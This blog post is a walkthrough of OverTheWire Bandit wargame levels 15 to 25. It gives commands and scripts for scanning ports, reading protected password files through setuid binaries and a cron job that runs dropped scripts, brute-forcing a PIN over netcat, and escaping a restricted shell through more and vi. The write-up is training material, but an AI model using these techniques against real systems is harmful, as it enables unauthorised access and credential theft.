---
layout: post
title: "OverTheWire - Bandit Levels 15 - 25"
date: 2017-02-05
description: "Walk-through guide to OverTheWire Bandit."
number: "0x0c"
---
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

This is my write-up of the [OverTheWire](http://overthewire.org) wargame [Bandit](http://overthewire.org/wargames/bandit/) levels 15 - 25. Levels 0 - 15 can be found [here](https://www.maxmunday.com/blog/2016/11/10/overthewire-bandit). If you notice any problems please [contact](/contact) me to let me know.
 
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 15 ]

For this level we use the command

{% highlight shell %}
$ openssl s_client -connect localhost:30001 -ign_eof
{% endhighlight %}

And submit the previous level's password to receive the password for the next level.

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 16 ]

To find the appropriate port in the range given we use the command

{% highlight shell %}
$ nmap -sV -p 31000-32000 localhost
{% endhighlight %}

from that we see that there are two ports that are open and running the service `msdtc`.

From that we have to attempt to connect to both to see which provides the correct response. 

{% highlight shell %}
$ openssl s_client -connect localhost:31790 -ign_eof
{% endhighlight %}

The first one simply echoed back the password, but the second port provides us an RSA private key. We need to submit that key to connect to the next level.

{% highlight shell %}
$ mkdir /tmp/key
$ nano /tmp/key/sshkey.pem
{% endhighlight %} 

Paste RSA key into the file and save and exit.

We need to change the permissions on the file so it will be accepted by the server.

{% highlight shell %}
$ chmod 600 /tmp/key/sshkey.pem
{% endhighlight %}

The we submit the key to the authenticate the connection to the next level

{% highlight shell %}
$ ssh -i /tmp/key/sshkey.pem bandit17@localhost
{% endhighlight %}

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 17 ]

To find the different line in the two files provided we simply execute the command

{% highlight shell %}
$ diff passwords.new passwords.old
{% endhighlight %}

It prints the password and we use it to log into the next level.

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 18 ]

This level logs us out immediately when we ssh in. 

To read the password in the readme file we enter the command

{% highlight shell %}
$ ssh bandit18@localhost cat readme
{% endhighlight %}

And the password prints in the terminal.

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 19 ]

We can run the setuid binary with the following arguments to reveal the password

{% highlight shell %}
$ ./bandit20-do cat /etc/bandit_pass/bandit20
{% endhighlight %}

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 20 ]

We need to use the setuid binary to read the previous level's password from another connection.

First we set a shell to listen on a specfic port that will also send the password when requested

{% highlight shell %}
$ echo "password" | nc -l 32112
{% endhighlight %}

where "password" is the previous level's password.

Then we make the connection on another shell to read the new password

{% highlight shell %}
$ ./suconnect 32112
{% endhighlight %}

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 21 ]

First we should inspect the cronjob that is refered to in the level description.

{% highlight shell %}
$ cd /etc/cron.d/
{% endhighlight %}

and we can inspect the contents of this directory

{% highlight shell %}
$ ls
{% endhighlight %}

We see there is a file titled cronjob_bandit22. We will inspect this

{% highlight shell %}
$ cat cronjob_bandit22
{% endhighlight %}

and we get

{% highlight shell %}
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
{% endhighlight %}

We should inspect the shell script to see what is being executed

{% highlight shell %}
$ cat /usr/bin/cronjob_bandit22.sh
{% endhighlight %}

we get

{% highlight shell linenos=table %}
#!/bin/bash 
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
{% endhighlight %}

This script is sending the password (located at `/etc/bandit_pass/bandit22`) to the `tmp` directory. 

We will inspect the contents of this file to reveal the password.

{% highlight shell %}
$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
{% endhighlight %}

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 22 ]

Again we start with inspecting the cron job

{% highlight shell %}
$ cat erc/cron.d/cronjob_bandit23
{% endhighlight %}

We see

{% highlight shell %}
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
{% endhighlight %}

We need to check the script being executed

{% highlight shell %}
$ cat /usr/bin/cronjob_bandit23.sh
{% endhighlight %}

We see

{% highlight shell linenos %}
#!/bin/bash                                                           
                                                                      
myname=$(whoami)                                                      
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)         
                                                                      
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
{% endhighlight %}

This script is sending the password to a file, the name of which, is being obfuscated through piping a string through md5 and cutting out the spaces. 

To reveal the file name we can simply run the command in another shell

{% highlight shell %}
$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
$ 8ca319486bfbbc3663ea0fbe81326349                  
{% endhighlight %}

We can then navigate to that file and reveal the password.

{% highlight shell %}
$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
{% endhighlight %} 

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 23 ]

Looking in the same location as last level we can check the cronjob script

{% highlight shell %}
$ cat /usr/bin/cronjob_bandit24.sh
{% endhighlight %}

And we see

{% highlight shell linenos %}
#!/bin/bash                                                     
                                                                
myname=$(whoami)                                                
                                                                
cd /var/spool/$myname                                           
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in *;                                                     
do                                                              
    echo "Handling $i"                                          
    ./$i                                                        
    rm -f $i                                                    
done                                                            
{% endhighlight %}

So we need to get a script into `/var/spool/bandit24` to give us the password.

{% highlight shell %}
$ mkdir /tmp/maxmunday
$ nano /tmp/maxmunday/getpw.sh
{% endhighlight %}

We write

{% highlight shell linenos %}
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/maxmunday

{% endhighlight %}

We then give the script and the folder the correct permissions to write and execute

{% highlight shell %}
$ chmod 777 /tmp/maxmunday/getpw.sh
$ chmod 777 /tmp/maxmunday/
{% endhighlight %}

Then we copy the script to the directory in the cronjob

{% highlight shell %}
$ cp /tmp/maxmunday/getpw.sh /var/spool/bandit24
{% endhighlight %}

Then after 1 minute we can check the /tmp/ directory

{% highlight shell %}
$ cat /tmp/maxmunday/bandit24
{% endhighlight %}

And the password is revealed.

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 24 ]

For this level we need to submit a four digit pin along with the previous level's password to port 30002. 

We need to brute-force the pin through a script. 

{% highlight shell %}
$ nano /tmp/maxmunday/getpin.sh
{% endhighlight %}

{% highlight shell linenos %}
#!/bin/bash

START=0000
LAST_PIN=9999
HOST="localhost"
PORT=30002
PASSWD="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

for i in `seq $START $LAST_PIN`;
do
        echo $PASSWD $i | nc $HOST $PORT >> result &
done
{% endhighlight %}

We then make the script executable

{% highlight shell %}
$ chmod 777 ./getpin.sh
{% endhighlight %}

And run it

{% highlight shell %}
$ ./getpin.sh
{% endhighlight %}

It takes a few minutes to finish, then we sort through the results to find the unique line that has the correct password

{% highlight shell %}
$ sort result | uniq -u
{% endhighlight %}

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 25 ]

After logging into Bandit25 we see an ssh key file in the home directory. We can use this to log into Bandit26

{% highlight shell %}
ssh -i bandit26.sshkey bandit26@localhost
{% endhighlight %}

However, it logs me out straight away. To investigate this we can look at the `passwd` file and get some extra information

{% highlight shell %}
$ cat /etc/passwd | grep bandit26
{% endhighlight %}

It shows us the default shell is located at `usr/bin/showtext`. We can investigate this for further information

{% highlight shell %}
$ cat usr/bin/showtext
{% endhighlight %}

Which shows us the following script

{% highlight shell linenos %}
#!/bin/sh

more ~/.text.txt
exit 0
{% endhighlight %}

So the script opens the text file using `more`, probably the Bandit26 title, then exits. 

Checking the man page for `more` we can see that it is possible to run a text editor command while it is still running. 

To have it run wihtout exiting we need to minimise the terminal so the whole text file is not displayed at once.

![](/pictures/bandit_4.png){:height="105px" width="554px"}

Then to open the text editor we type `v`. This opens a vi editor, because I haven't used vi much I was looking through the man page and saw an interesting command

{% highlight shell %}
:set shell sh=/bin/bash
{% endhighlight %}

This sets the default shell back to bash.

![](/pictures/bandit_6.png){:height="108px" width="548px"}

Then we can open a shell using 

{% highlight shell %}
:sh
{% endhighlight %}

It then opens a new shell

![](/pictures/bandit_7.png){:height="105px" width="554px"}

And we can navigate to the password file

{% highlight shell %}
$ cat /etc/bandit_pass/bandit27
{% endhighlight %}

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-


\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-